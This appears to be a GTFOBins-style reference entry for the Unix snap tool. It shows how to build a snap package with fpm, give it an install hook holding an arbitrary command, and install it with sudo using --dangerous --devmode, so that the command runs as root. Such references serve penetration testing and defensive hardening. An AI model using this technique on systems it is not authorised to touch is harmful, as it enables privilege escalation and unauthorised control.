---
type: gtfobin
name: snap
platform: Unix
functions: [command]
tags: [gtfobin, unix, lotl]
---

# snap

## command

```bash
snap install xxxx_1.0_all.snap --dangerous --devmode
```
_Generate the Snap package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.

```
mkdir -p meta/hooks
echo -e '#!/bin/sh\n/path/to/command; false' >meta/hooks/install
chmod +x meta/hooks/install
fpm -n xxxx -s dir -t snap -a all meta
```_
**Contexts:** sudo
